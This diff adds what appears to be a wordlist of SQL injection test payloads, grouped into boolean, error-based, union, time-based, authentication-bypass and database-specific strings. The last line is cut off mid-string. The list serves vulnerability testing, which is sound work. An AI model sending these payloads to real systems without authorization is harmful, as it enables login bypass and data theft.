@@ -1,0 +1,59 @@
+# SQL Injection Payloads
+# These payloads test for SQL injection vulnerabilities
+# Format: One payload per line
+
+# Boolean-based blind SQLi
+' OR '1'='1
+' OR '1'='1' --
+' OR '1'='1' /*
+' OR 1=1--
+" OR "1"="1
+" OR 1=1--
+
+# Error-based SQLi
+'
+"
+`
+')
+")
+`)
+'))
+"))
+`))
+
+# Union-based SQLi
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION ALL SELECT NULL--
+
+# Time-based blind SQLi
+' AND SLEEP(5)--
+' OR SLEEP(5)--
+'; WAITFOR DELAY '0:0:5'--
+
+# Authentication bypass
+admin' --
+admin' #
+admin'/*
+' or 1=1--
+' or 1=1#
+' or 1=1/*
+') or '1'='1--
+') or ('1'='1--
+
+# Advanced payloads
+1' AND '1'='1
+1' AND '1'='2
+1 AND 1=1
+1 AND 1=2
+1' ORDER BY 1--
+1' ORDER BY 2--
+1' ORDER BY 3--
+
+# Database-specific
+' OR 'x'='x
+' AND id IS NULL; --
+admin' OR 1=1 LIMIT 1--
+' UNION SELECT @@version--
+' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
